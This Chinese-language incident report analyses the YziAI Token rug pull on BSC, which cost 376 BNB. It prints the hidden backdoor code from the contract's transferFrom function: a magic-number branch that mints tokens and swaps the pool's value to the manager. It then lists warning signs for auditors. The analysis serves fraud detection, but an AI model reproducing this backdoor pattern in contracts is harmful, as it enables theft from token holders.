# YziAI Token Hack 根因分析报告

## 📊 执行摘要
- **项目**: YziAI Token
- **日期**: 2025-03-27
- **网络**: BSC
- **损失**: 376 BNB (~$239,400 USD)
- **类型**: Rug Pull - 隐藏后门
- **级别**: 🔴 严重

## 🎯 攻击概览
- 攻击者(项目方): `0x63FC3fF98De8d5cA900e68E6c6F41a7CA949c453`
- 代币合约: `0x7fDfF64Bf87bad52e6430BDa30239bD182389Ee3`
- 攻击TX: [`0x4821392c0b27a4acc952ff51f07ed5dc74d4b67025c57232dae44e4fef1f30e8`](https://bscscan.com/tx/0x4821392c0b27a4acc952ff51f07ed5dc74d4b67025c57232dae44e4fef1f30e8)

## 💻 技术分析

### 后门机制

**transferFrom中的隐藏rug pull代码**：

```solidity
function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
    // 🚨 隐藏的后门：特殊条件触发rug pull
    if(msg.sender == manager && amount == 1199002345) {
        // 🔥 Mint大量代币
        _mint(address(this), supply * 10000);
        
        // 🔥 授权router
        _approve(address(this), router, supply * 100000);
        
        //🔥 将所有代币换成BNB发送给manager
        path.push(address(this));
        path.push(router.WETH());
        
        router.swapExactTokensForETH(
            balanceOf(to) * 1000,
            1,
            path,
            manager,  // 项目方地址
            block.timestamp + 1e10
        );
        return true;
    }
    // 正常转账逻辑...
}
```

### 攻击流程
```
1. 项目正常运营，吸引用户
2. LP中累积376 BNB价值
3. 项目方调用: transferFrom(LP, LP, 1199002345)
4. 触发后门代码：
   - Mint巨量代币
   - Swap所有LP中的代币换成BNB
   - BNB发送到manager地址
5. Rug pull完成，获利376 BNB
```

## 🎯 根本原因

**恶意设计的后门**：
- 在transferFrom中隐藏rug pull代码
- 使用魔术数字(1199002345)作为触发条件
- 伪装成正常的ERC20合约

### 识别方法
```solidity
// 🚨 危险信号：
// 1. transferFrom有特殊条件分支
// 2. 存在magic number
// 3. 项目方有manager特权
// 4. 可以mint无限代币
// 5. 可以操纵swap
```

## 📝 总结

YziAI是精心设计的Rug Pull，通过在transferFrom中隐藏后门代码，在适当时机触发并卷走$239k。

**教训**:
- ⚠️ 仔细审计所有ERC20函数
- ⚠️ 警惕复杂的条件分支
- ⚠️ 检查是否有mint权限
- ⚠️ 要求项目renounceOwnership

---
**报告生成**: 2025-10-12 | **版本**: 1.0

